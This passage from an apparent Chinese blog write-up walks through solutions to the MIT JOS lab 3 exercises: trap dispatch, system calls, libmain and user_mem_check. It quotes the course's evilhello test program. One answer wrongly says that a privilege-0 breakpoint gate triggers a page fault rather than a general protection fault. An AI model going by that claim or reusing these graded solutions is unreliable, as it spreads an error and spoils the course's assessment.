3: Your code here.</span><br><span class="hljs-keyword">switch</span>(tf-&gt;tf_trapno)<br>&#123;<br><span class="hljs-keyword">case</span> T_DIVIDE:<br><span class="hljs-keyword">case</span> T_DEBUG:<br><span class="hljs-keyword">case</span> T_NMI:<br><span class="hljs-keyword">case</span> T_BRKPT:<br><span class="hljs-keyword">case</span> T_OFLOW:<br><span class="hljs-keyword">case</span> T_BOUND:<br><span class="hljs-keyword">case</span> T_ILLOP:<br><span class="hljs-keyword">case</span> T_DEVICE:<br><span class="hljs-keyword">case</span> T_DBLFLT:<br><span class="hljs-keyword">case</span> T_TSS:<br><span class="hljs-keyword">case</span> T_SEGNP:<br><span class="hljs-keyword">case</span> T_STACK:<br><span class="hljs-keyword">case</span> T_GPFLT:<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> T_PGFLT:<br>page_fault_handler(tf);<br><span class="hljs-keyword">return</span> ;<br><span class="hljs-keyword">case</span> T_FPERR:<br><span class="hljs-keyword">case</span> T_ALIGN:<br><span class="hljs-keyword">case</span> T_MCHK:<br><span class="hljs-keyword">case</span> T_SIMDERR:<br><span class="hljs-keyword">case</span> T_SYSCALL:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// Unexpected trap: The user process or the kernel has a bug.</span><br>print_trapframe(tf);<br><span class="hljs-keyword">if</span> (tf-&gt;tf_cs == GD_KT)<br>panic(<span class="hljs-string">&quot;unhandled trap in kernel&quot;</span>);<br><span class="hljs-keyword">else</span> &#123;<br>env_destroy(curenv);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行评分程序，成功通过缺页异常部分：</p><p><img src="https://s2.loli.net/2022/03/17/6CYuBxpQh5njEvP.png" alt="image.png"></p><h3 id="The-Breakpoint-Exception"><a href="#The-Breakpoint-Exception" class="headerlink" title="The Breakpoint Exception"></a>The Breakpoint Exception</h3><p>断点异常通常被用于调试程序，调试原理是将程序中对应指令替换为 int3 软中断；在 JOS 中我们将其转化为任何用户环境都可以唤醒一个 JOS kernel monitor 的一个“伪系统调用”</p><p>接下来是 Exercise 6，补完 <code>trap_dispatch()</code> 使得断点异常能唤起一个 kernel monitor</p><blockquote><p><strong>Exercise 6.</strong> Modify <code>trap_dispatch()</code> to make breakpoint exceptions invoke the kernel monitor. You should now be able to get make grade to succeed on the <code>breakpoint</code> test.</p></blockquote><p>简单修改一下之前的大 switch 即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> T_BRKPT:<br>monitor(tf);<br><span class="hljs-keyword">return</span> ;<br></code></pre></td></tr></table></figure><p>此时应该能通过 grade 中的断点评分</p><p><img src="https://s2.loli.net/2022/03/17/sJYUfEvIPtBrdFo.png" alt="image.png"></p><p>接下来又是 Challenge，完成单步调试器：</p><blockquote><p><em>Challenge!</em> Modify the JOS kernel monitor so that you can ‘continue’ execution from the current location (e.g., after the <code>int3</code>, if the kernel monitor was invoked via the breakpoint exception), and so that you can single-step one instruction at a time. You will need to understand certain bits of the <code>EFLAGS</code> register in order to implement single-stepping.</p><p><em>Optional:</em> If you’re feeling really adventurous, find some x86 disassembler source code - e.g., by ripping it out of QEMU, or out of GNU binutils, or just write it yourself - and extend the JOS kernel monitor to be able to disassemble and display instructions as you are stepping through them. Combined with the symbol table loading from lab 1, this is the stuff of which real kernel debuggers are made.</p></blockquote><p><del>闲出屁来才有时间去做这玩意，👴忙着呢</del></p><p>之后是习题 Time：</p><blockquote><p><strong>Questions</strong></p><ol><li><p>The break point test case will either generate a break point exception or a general protection fault depending on how you initialized the break point entry in the IDT (i.e., your call to <code>SETGATE</code> from <code>trap_init</code>). Why? How do you need to set it up in order to get the breakpoint exception to work as specified above and what incorrect setup would cause it to trigger a general protection fault?</p><p>这取决于 IDT 中门描述符的特权级，若特权级为 0 ，用户进程没有权限访问对应页面，自然会触发缺页异常；若特权级为3，则自然能正常通过门描述符触发断点异常。</p></li><li><p>What do you think is the point of these mechanisms, particularly in light of what the <code>user/softint</code> test program does?</p><p>目的是不允许用户随意通过门描述符进入不该进入的处理程序中</p></li></ol></blockquote><h3 id="System-calls"><a href="#System-calls" class="headerlink" title="System calls"></a>System calls</h3><p>用户进程通过系统调用向内核请求资源，当用户进程进行系统调用时，处理器进入内核态，保存用户进程上下文，之后内核执行对应的系统调用代码，最后恢复回用户进程</p><p>在 JOS 中我们使用 <code>int 0x30</code> 来实现系统调用，进程通过对应的寄存器传递系统调用号（eax）与参数（edx，ecx，ebx，edi，esi），返回值存放在 rax 寄存器中</p><p>接下来是 Exercise 7，补完 JOS 的系统调用机制</p><blockquote><p><strong>Exercise 7.</strong> Add a handler in the kernel for interrupt vector <code>T_SYSCALL</code>. You will have to edit <code>kern/trapentry.S</code> and <code>kern/trap.c</code>‘s <code>trap_init()</code>. You also need to change <code>trap_dispatch()</code> to handle the system call interrupt by calling <code>syscall()</code> (defined in <code>kern/syscall.c</code>) with the appropriate arguments, and then arranging for the return value to be passed back to the user process in <code>%eax</code>. Finally, you need to implement <code>syscall()</code> in <code>kern/syscall.c</code>. Make sure <code>syscall()</code> returns <code>-E_INVAL</code> if the system call number is invalid. You should read and understand <code>lib/syscall.c</code> (especially the inline assembly routine) in order to confirm your understanding of the system call interface. Handle all the system calls listed in <code>inc/syscall.h</code> by invoking the corresponding kernel function for each call.</p><p>Run the <code>user/hello</code> program under your kernel (make run-hello). It should print “<code>hello, world</code>“ on the console and then cause a page fault in user mode. If this does not happen, it probably means your system call handler isn’t quite right. You should also now be able to get make grade to succeed on the <code>testbss</code> test.</p></blockquote><p>首先是在大 switch 里调用 JOS 的 syscall 接口，这里<strong>别忘了显式地将返回值给到 eax</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> T_SYSCALL:<br>tf-&gt;tf_regs.reg_eax = syscall(tf-&gt;tf_regs.reg_eax, <br>tf-&gt;tf_regs.reg_edx, tf-&gt;tf_regs.reg_ecx, <br>tf-&gt;tf_regs.reg_ebx, tf-&gt;tf_regs.reg_edi, <br>tf-&gt;tf_regs.reg_esi);<br><span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure><p>之后修改 <code>kern/syscall.c</code> 中的 <code>syscall()</code> 函数，笔者本想选择声明一个系统调用表，在进行调用时直接查表调用即可，但是 JOS 已经写了一个 switch 在这里，那就一切从简吧（笑）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Dispatches to the correct kernel function, passing the arguments.</span><br><span class="hljs-type">int32_t</span><br><span class="hljs-title function_">syscall</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> syscallno, <span class="hljs-type">uint32_t</span> a1, <span class="hljs-type">uint32_t</span> a2, <span class="hljs-type">uint32_t</span> a3, <span class="hljs-type">uint32_t</span> a4, <span class="hljs-type">uint32_t</span> a5)</span><br>&#123;<br><span class="hljs-comment">// Call the function corresponding to the &#x27;syscallno&#x27; parameter.</span><br><span class="hljs-comment">// Return any appropriate return value.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-comment">// panic(&quot;syscall not implemented&quot;);</span><br><br><span class="hljs-keyword">switch</span> (syscallno) &#123;<br><span class="hljs-keyword">case</span> SYS_cputs:<br>sys_cputs((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)a1, a2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">case</span> SYS_cgetc:<br><span class="hljs-keyword">return</span> sys_cgetc();<br><span class="hljs-keyword">case</span> SYS_getenvid:<br><span class="hljs-keyword">return</span> sys_getenvid();<br><span class="hljs-keyword">case</span> SYS_env_destroy:<br><span class="hljs-keyword">return</span> sys_env_destroy(a1);<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -E_INVAL;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>完成之后应当能通过 grade 里的 testbss：</p><p><img src="https://s2.loli.net/2022/03/17/qseB1tyViWIrdDG.png" alt="image.png"></p><p>之后是 Challenge，修改代码使用 sysenter 与 sysexit 实现系统调用机制</p><blockquote><p><em>hallenge!</em> Implement system calls using the <code>sysenter</code> and <code>sysexit</code> instructions instead of using <code>int 0x30</code> and <code>iret</code>.</p><p>The <code>sysenter/sysexit</code> instructions were designed by Intel to be faster than <code>int/iret</code>. They do this by using registers instead of the stack and by making assumptions about how the segmentation registers are used. The exact details of these instructions can be found in Volume 2B of the Intel reference manuals.</p><p>The easiest way to add support for these instructions in JOS is to add a <code>sysenter_handler</code> in <code>kern/trapentry.S</code> that saves enough information about the user environment to return to it, sets up the kernel environment, pushes the arguments to <code>syscall()</code> and calls <code>syscall()</code> directly. Once <code>syscall()</code> returns, set everything up for and execute the <code>sysexit</code> instruction. You will also need to add code to <code>kern/init.c</code> to set up the necessary model specific registers (MSRs). Section 6.1.2 in Volume 2 of the AMD Architecture Programmer’s Manual and the reference on SYSENTER in Volume 2B of the Intel reference manuals give good descriptions of the relevant MSRs. You can find an implementation of <code>wrmsr</code> to add to <code>inc/x86.h</code> for writing to these MSRs <a href="http://ftp.kh.edu.tw/Linux/SuSE/people/garloff/linux/k6mod.c">here</a>.</p><p>Finally, <code>lib/syscall.c</code> must be changed to support making a system call with <code>sysenter</code>. Here is a possible register layout for the <code>sysenter</code> instruction:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">eax</span>                - <span class="hljs-keyword">syscall</span> number<br><span class="hljs-built_in">edx</span>, <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">edi</span> - arg1, arg2, arg3, arg4<br><span class="hljs-built_in">esi</span>                - return pc<br><span class="hljs-built_in">ebp</span>                - return <span class="hljs-built_in">esp</span><br><span class="hljs-built_in">esp</span>                - trashed by <span class="hljs-keyword">sysenter</span><br><br></code></pre></td></tr></table></figure><p>GCC’s inline assembler will automatically save registers that you tell it to load values directly into. Don’t forget to either save (push) and restore (pop) other registers that you clobber, or tell the inline assembler that you’re clobbering them. The inline assembler doesn’t support saving <code>%ebp</code>, so you will need to add code to save and restore it yourself. The return address can be put into <code>%esi</code> by using an instruction like <code>leal after_sysenter_label, %%esi</code>.</p><p>Note that this only supports 4 arguments, so you will need to leave the old method of doing system calls around to support 5 argument system calls. Furthermore, because this fast path doesn’t update the current environment’s trap frame, it won’t be suitable for some of the system calls we add in later labs.</p><p>You may have to revisit your code once we enable asynchronous interrupts in the next lab. Specifically, you’ll need to enable interrupts when returning to the user process, which <code>sysexit</code> doesn’t do for you.</p></blockquote><p><del>没那闲工夫，👴选择摸了</del></p><h3 id="User-mode-startup"><a href="#User-mode-startup" class="headerlink" title="User-mode startup"></a>User-mode startup</h3><p>用户进程的入口点在 <code>lib/entry.S</code>，其在初始化后会调用 <code>libmain()</code>，接下来我们要修改该函数：将全局变量 <code>thisenv</code> 指向当前进程的 Env 结构体</p><p><code>libmain()</code> 之后会调用 <code>umain()</code>，定义于 <code>user/hello.c</code> 中，在打印 hello world 之后其会尝试访问 <code>thisenv-&gt;env_id</code>，在之前的实验中这会触发异常，接下来我们应当初始化 <code>thisenv</code> 以让他不触发异常</p><p>于是我们来到了 Exercise 8，<strong>进入到用户态的世界</strong>（其实系统调用那里已经在用户态与内核态“来去之间”了）</p><blockquote><p><strong>Exercise 8.</strong> Add the required code to the user library, then boot your kernel. You should see <code>user/hello</code> print “<code>hello, world</code>“ and then print “<code>i am environment 00001000</code>“. <code>user/hello</code> then attempts to “exit” by calling <code>sys_env_destroy()</code> (see <code>lib/libmain.c</code> and <code>lib/exit.c</code>). Since the kernel currently only supports one user environment, it should report that it has destroyed the only environment and then drop into the kernel monitor. You should be able to get make grade to succeed on the <code>hello</code> test.</p></blockquote><p>获取到进程 id 后遍历 envs 数组即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">libmain</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-comment">// set thisenv to point at our Env structure in envs[].</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-type">int</span> env_id;<br><span class="hljs-type">size_t</span> i;<br><br>env_id = sys_getenvid();<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NENV; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (envs[i].env_id == env_id)<br>&#123;<br>thisenv = &amp;envs[i];<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">// thisenv = 0;</span><br><br><span class="hljs-comment">// save the name of the program so that panic() can use it</span><br><span class="hljs-keyword">if</span> (argc &gt; <span class="hljs-number">0</span>)<br>binaryname = argv[<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">// call user main routine</span><br>umain(argc, argv);<br><br><span class="hljs-comment">// exit gracefully</span><br><span class="hljs-built_in">exit</span>();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这时运行评分程序应当能通过 hello：</p><p><img src="https://s2.loli.net/2022/03/17/nUNeugYvxTH7p5b.png" alt="image.png"></p><h3 id="Page-faults-and-memory-protection"><a href="#Page-faults-and-memory-protection" class="headerlink" title="Page faults and memory protection"></a>Page faults and memory protection</h3><p>OS 通常依赖于硬件以保护内存，当一个程序尝试访问非法地址或无权限地址时处理器会停止进程运行，并带着造成异常的指令信息陷入内核，若该异常可以被修复则内核将其修复后再让程序继续运行，否则会终止程序运行</p><p>一个可以被修复的异常的范例便是栈的增长，在初始时我们仅为用户进程栈分配了一张页，当栈突破一张页的大小时便会触发缺页异常，此时内核应当自动分配一个新的内存页到该处，并让程序继续运行</p><p>系统调用同样可以在内存保护上造成问题：大部分的系统调用接口都会让用户程序向内核传递一个指针，而内核需要解引用这些指针，这便会有两个问题“</p><ul><li>内核空间中的缺页异常比用户空间中的缺页异常要严重得多，若内核在操纵自己的数据结构时出现缺页异常，那就是 kernel bug，应当引起 kernel panic，但若这些指针来自于用户进程，则应当要标识出这缺页异常是代表用户进程的</li><li>内核有着高于用户进程的权限，因此用户程序可能会传递一个指向用户不可读写但是内核可读写的区域，这也是内核需要注意的</li></ul><p>因此接下来我们要实现一个地址检查的功能，内核需要用其来检查用户程序传入的指针是否指向用户空间，以及页表是否允许相关操作</p><p>以此，内核永远不会因为解引用用户提供的指针而造成缺页异常，若内核发生了缺页异常，则应当 panic——这就是接下来的 Exercise 9，修改 <code>kern/trap.c</code> 让内核态下发生的缺页异常造成 kernel panic</p><blockquote><p><strong>Exercise 9.</strong> Change <code>kern/trap.c</code> to panic if a page fault happens in kernel mode.</p><p>Hint: to determine whether a fault happened in user mode or in kernel mode, check the low bits of the <code>tf_cs</code>.</p><p>Read <code>user_mem_assert</code> in <code>kern/pmap.c</code> and implement <code>user_mem_check</code> in that same file.</p><p>Change <code>kern/syscall.c</code> to sanity check arguments to system calls.</p><p>Boot your kernel, running <code>user/buggyhello</code>. The environment should be destroyed, and the kernel should <em>not</em> panic. You should see:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-number">00001000</span>] user_mem_check <span class="hljs-keyword">assertion</span> failure <span class="hljs-keyword">for</span> va <span class="hljs-number">00000001</span><br>[<span class="hljs-number">00001000</span>] free env <span class="hljs-number">00001000</span><br>Destroyed the <span class="hljs-keyword">only</span> environment - <span class="hljs-keyword">nothing</span> more <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span>!<br><br></code></pre></td></tr></table></figure><p>Finally, change <code>debuginfo_eip</code> in <code>kern/kdebug.c</code> to call <code>user_mem_check</code> on <code>usd</code>, <code>stabs</code>, and <code>stabstr</code>. If you now run <code>user/breakpoint</code>, you should be able to run backtrace from the kernel monitor and see the backtrace traverse into <code>lib/libmain.c</code> before the kernel panics with a page fault. What causes this page fault? You don’t need to fix it, but you should understand why it happens.</p></blockquote><p>首先是修改缺页异常处理程序，若我们需要确定一个缺页异常发生在用户态还是内核态，只需要检查 Trapframe 中 cs 段寄存器的 RPL 位即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">page_fault_handler</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br><span class="hljs-type">uint32_t</span> fault_va;<br><br><span class="hljs-comment">// Read processor&#x27;s CR2 register to find the faulting address</span><br>fault_va = rcr2();<br><br><span class="hljs-comment">// Handle kernel-mode page faults.</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-comment">// check whether it happened in kernel mode or not</span><br><span class="hljs-keyword">if</span> (!(tf-&gt;tf_cs &amp; <span class="hljs-number">0b11</span>))<br>panic(<span class="hljs-string">&quot;kernel page fault!&quot;</span>);<br><br><span class="hljs-comment">// We&#x27;ve already handled kernel-mode exceptions, so if we get here,</span><br><span class="hljs-comment">// the page fault happened in user mode.</span><br><br><span class="hljs-comment">// Destroy the environment that caused the fault.</span><br>cprintf(<span class="hljs-string">&quot;[%08x] user fault va %08x ip %08x\n&quot;</span>,<br>curenv-&gt;env_id, fault_va, tf-&gt;tf_eip);<br>print_trapframe(tf);<br>env_destroy(curenv);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="user-mem-check-：检查用户地址合法性"><a href="#user-mem-check-：检查用户地址合法性" class="headerlink" title="user_mem_check()：检查用户地址合法性"></a>user_mem_check()：检查用户地址合法性</h4><p>最后是修改 <code>user_mem_check()</code>，主要是以下两点：</p><ul><li>检查地址是否落在用户空间</li><li>检查页表项，用户是否有相应权限</li></ul><p>这里需要注意的是可能发生的整型溢出导致的地址回绕：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Check that an environment is allowed to access the range of memory</span><br><span class="hljs-comment">// [va, va+len) with permissions &#x27;perm | PTE_P&#x27;.</span><br><span class="hljs-comment">// Normally &#x27;perm&#x27; will contain PTE_U at least, but this is not required.</span><br><span class="hljs-comment">// &#x27;va&#x27; and &#x27;len&#x27; need not be page-aligned; you must test every page that</span><br><span class="hljs-comment">// contains any of that range.  You will test either &#x27;len/PGSIZE&#x27;,</span><br><span class="hljs-comment">// &#x27;len/PGSIZE + 1&#x27;, or &#x27;len/PGSIZE + 2&#x27; pages.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// A user program can access a virtual address if (1) the address is below</span><br><span class="hljs-comment">// ULIM, and (2) the page table gives it permission.  These are exactly</span><br><span class="hljs-comment">// the tests you should implement here.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If there is an error, set the &#x27;user_mem_check_addr&#x27; variable to the first</span><br><span class="hljs-comment">// erroneous virtual address.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Returns 0 if the user program can access this range of addresses,</span><br><span class="hljs-comment">// and -E_FAULT otherwise.</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">int</span><br><span class="hljs-title function_">user_mem_check</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *env, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *va, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> perm)</span><br>&#123;<br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-type">uint32_t</span> start, end;<br><span class="hljs-type">pte_t</span> *pte;<br><br>start = ((<span class="hljs-type">uint32_t</span>) va) &amp; (~(PGSIZE - <span class="hljs-number">1</span>));<br>end = ROUNDUP(((<span class="hljs-type">uint32_t</span>) va) + len, PGSIZE);<br><br><span class="hljs-keyword">for</span> (; start &lt; end; start += PGSIZE)<br>&#123;<br>pte = pgdir_walk(env-&gt;env_pgdir, (<span class="hljs-type">void</span>*)start, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> ((!pte) || (start &gt;= ULIM) || !(*pte &amp; PTE_P) || ((*pte &amp; perm) != perm))<br>&#123;<br>user_mem_check_addr =  (start &lt; (<span class="hljs-type">uint32_t</span>)va ? (<span class="hljs-type">uint32_t</span>)va : start);<br><span class="hljs-keyword">return</span> -E_FAULT;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后是修改 <code>debuginfo_eip()</code>，在 <code>usd</code>, <code>stabs</code>, <code>stabstr</code> 这三个地方加上 <code>user_mem_check()</code> 进行地址合法性检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">// Make sure this memory is valid.</span><br><span class="hljs-comment">// Return -1 if it is not.  Hint: Call user_mem_check.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-keyword">if</span> (user_mem_check(curenv, (<span class="hljs-type">void</span>*)usd, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> UserStabData), PTE_U))<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>stabs = usd-&gt;stabs;<br>stab_end = usd-&gt;stab_end;<br>stabstr = usd-&gt;stabstr;<br>stabstr_end = usd-&gt;stabstr_end;<br><br><span class="hljs-comment">// Make sure the STABS and string table memory is valid.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-keyword">if</span> (user_mem_check(curenv, (<span class="hljs-type">void</span>*)stabs, stab_end - stabs, PTE_U))<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br><span class="hljs-keyword">if</span> (user_mem_check(curenv, (<span class="hljs-type">void</span>*)stabstr, stabstr_end - stabstr, PTE_U))<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>最后是 Exercise 10，防止 evilhello 导致 kernel panic</p><blockquote><p><strong>Exercise 10.</strong> Boot your kernel, running <code>user/evilhello</code>. The environment should be destroyed, and the kernel should not panic. You should see:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">[<span class="hljs-number">00000000</span>] new env <span class="hljs-number">00001000</span><br>...<br>[<span class="hljs-number">00001000</span>] user_mem_check assertion failure for va f010000c<br>[<span class="hljs-number">00001000</span>] free env <span class="hljs-number">00001000</span><br></code></pre></td></tr></table></figure></blockquote><p>我们先看 <code>user/evilhello.c</code> ，里面为系统调用 <code>sys_cputs()</code> 传递了一个内核空间中的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// evil hello world -- kernel pointer passed to kernel</span><br><span class="hljs-comment">// kernel should destroy user environment in response</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inc/lib.h&gt;</span></span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">umain</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-comment">// try to print the kernel entry point as a string!  mua ha ha!</span><br>sys_cputs((<span class="hljs-type">char</span>*)<span class="hljs-number">0xf010000c</span>, <span class="hljs-number">100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>因此我们只需要在对应系统调用加上地址合法性检查即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Print a string to the system console.</span><br><span class="hljs-comment">// The string is exactly &#x27;len&#x27; characters long.</span><br><span class="hljs-comment">// Destroys the environment on memory errors.</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">sys_cputs</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br><span class="hljs-comment">// Check that the user has permission to read memory [s, s+len).</span><br><span class="hljs-comment">// Destroy the environment if not.</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br>user_mem_assert(curenv, s, len, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// Print the string supplied by the user.</span><br>cprintf(<span class="hljs-string">&quot;%.*s&quot;</span>, len, s);<br>&#125;<br></code></pre></td></tr></table></figure><p>运行评分程序，我们成功通过了所有测试，拿到满分</p><p><img src="https://s2.loli.net/2022/03/17/Xo6q4wWvFJptYzl.png" alt="image.png"></p><p>至此， lab3 全部完成</p><h1 id="0x04-Lab-4-Preemptive-Multitasking"><a href="#0x04-Lab-4-Preemptive-Multitasking" class="headerlink" title="0x04. Lab 4: Preemptive Multitasking"></a>0x04. Lab 4: Preemptive Multitasking</h1><p>在 lab4 中我们将实现抢占式多任务调度</p><p>首先还是先 commit lab3 的代码，把 lab4 分支拉下来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git add .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -m <span 